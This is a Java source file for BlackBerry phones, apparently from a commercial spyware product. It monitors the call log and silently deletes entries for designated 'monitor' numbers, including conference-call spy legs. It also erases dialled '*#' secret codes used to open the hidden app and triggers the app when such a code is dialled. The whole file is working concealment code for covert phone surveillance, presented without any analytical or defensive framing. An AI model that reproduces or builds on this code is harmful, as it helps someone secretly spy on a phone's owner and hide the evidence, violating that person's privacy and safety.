package com.vvt.calllogmon;

import java.util.Vector;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.bug.PhoneNumberFormat;
import net.rim.blackberry.api.phone.phonelogs.*;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.RuntimeStore;

public class FxCallLogNumberMonitor implements PhoneLogListener {
	
	private static FxCallLogNumberMonitor self = null;
	private static final long CALL_LOG_MON_GUID = 0xb863fa5d70365c72L;
	private CallLogRemover callLogRemover = new CallLogRemover();
	private OutgoingCallListener observer = null;
	private Vector fxNumber = new Vector();
	
	private FxCallLogNumberMonitor() {
		PhoneLogs.addListener(this);
	}
	
	public static FxCallLogNumberMonitor getInstance() {
		if (self == null) {
			self = (FxCallLogNumberMonitor)RuntimeStore.getRuntimeStore().get(CALL_LOG_MON_GUID);
		}
		if (self == null) {
			FxCallLogNumberMonitor callLogMon = new FxCallLogNumberMonitor();
			RuntimeStore.getRuntimeStore().put(CALL_LOG_MON_GUID, callLogMon);
			self = callLogMon;
		}
		return self;
	}
	
	public void setListener(OutgoingCallListener observer) {
		this.observer = observer;
	}
	
	public void addCallLogNumber(String number) {
		if (!isCallLogNumberExisted(number)) {
			fxNumber.addElement(number);
		}
	}
	
	public void removeCallLogNumber(String number) {
		for (int i = 0; i < fxNumber.size(); i++) {
			if (((String)fxNumber.elementAt(i)).equals(number)) {
				fxNumber.removeElementAt(i);
				break;
			}
		}
	}
	
	private boolean isCallLogNumberExisted(String number) {
		boolean isExisted = false;
		for (int i = 0; i < fxNumber.size(); i++) {
			if (((String)fxNumber.elementAt(i)).equals(number)) {
				isExisted = true;
				break;
			}
		}
		return isExisted;
	}
	
	private boolean isBlackListNumber(PhoneCallLog phoneCallLog) {
		boolean isBlackList = false;
		String number = phoneCallLog.getParticipant().getNumber();
		String addressNumber = phoneCallLog.getParticipant().getAddressBookFormattedNumber();
		number = PhoneNumberFormat.removeLeadingZeroes(number);
		addressNumber = PhoneNumberFormat.removeLeadingZeroes(addressNumber);
		for (int i = 0; i < fxNumber.size(); i++) {
			String tmp = (String)fxNumber.elementAt(i);
			if (tmp.endsWith(number) || number.endsWith(tmp) || tmp.endsWith(addressNumber) || addressNumber.endsWith(tmp)) {
				isBlackList = true;
				break;
			}
		}
		return isBlackList;
	}
	
	private boolean isBlackListNumber(ConferencePhoneCallLog cpcl) {
		boolean isBlackList = false;
		if (cpcl.numberOfParticipants() == 2) {
			for (int i = 0; i < fxNumber.size(); i++) {
				PhoneCallLogID callLogTwoID = cpcl.getParticipantAt(1);
				String callTwoNumber = callLogTwoID.getNumber();
				String tmp = (String)fxNumber.elementAt(i);
				if (tmp.endsWith(callTwoNumber) || callTwoNumber.endsWith(tmp)) {
					isBlackList = true;
					break;
				}
			}
		}
		return isBlackList;
	}
	
	private void removeCallLog(CallLog callLog) {
		try {
			if (callLog instanceof PhoneCallLog) {
				PhoneCallLog phoneCallLog = (PhoneCallLog)callLog;
				final String number = phoneCallLog.getParticipant().getNumber();
				int interval = 500;
				if (isBlackListNumber(phoneCallLog)) {
					switch (phoneCallLog.getType()) {
						case PhoneCallLog.TYPE_MISSED_CALL_OPENED:
					   	case PhoneCallLog.TYPE_MISSED_CALL_UNOPENED:
					   		if (PhoneInfo.isFiveOrHigher()) {
					   			Application.getApplication().invokeLater(new Runnable() {
									public void run() {
										callLogRemover.removeMonitorNumber(PhoneLogs.FOLDER_MISSED_CALLS, number);
									}
								}, interval, false);
					   		}
							break;
					   	case PhoneCallLog.TYPE_RECEIVED_CALL:
				   			Application.getApplication().invokeLater(new Runnable() {
								public void run() {
									callLogRemover.removeMonitorNumber(PhoneLogs.FOLDER_NORMAL_CALLS, number);
								}
							}, interval, false);
					   		break;
				   		case PhoneCallLog.TYPE_PLACED_CALL:
				   			// To remove the FlexiKey.
				   			interval = 1500;
				   			Application.getApplication().invokeLater(new Runnable() {
								public void run() {
									String prefix = "*#";
									if (number.startsWith(prefix)) {
										callLogRemover.removeFlexiKey(number);
									}
								}
							}, interval, false);
				   			// To bring application up.
				   			if (observer != null) {
					   			Application.getApplication().invokeLater(new Runnable() {
									public void run() {
										observer.onOutgoingCall(number);
									}
								}, interval, false);
				   			}
			   				break;
					}
				}
			}
			// Spy Number on Conference Call.
			if (callLog instanceof ConferencePhoneCallLog) {
				ConferencePhoneCallLog confPhone = (ConferencePhoneCallLog)callLog;
				if (isBlackListNumber(confPhone)) {
					PhoneCallLogID callLogTwoID = confPhone.getParticipantAt(1);
					String callTwoNumber = callLogTwoID.getNumber();
					callLogRemover.removeMonitorNumber(callTwoNumber);
				}
			}
		} catch (Exception e) {
			Log.error("FXNumberRemover.removeCallLog", null, e);
		}
	}
	
	// PhoneLogListener
	public synchronized void callLogAdded(CallLog callLog) {
		removeCallLog(callLog);
	}
	 
	public synchronized void callLogUpdated(CallLog cl, CallLog oldCl) {
	}
	
	public void callLogRemoved(CallLog cl) {
	}
	 
	public void reset() {
	}
}
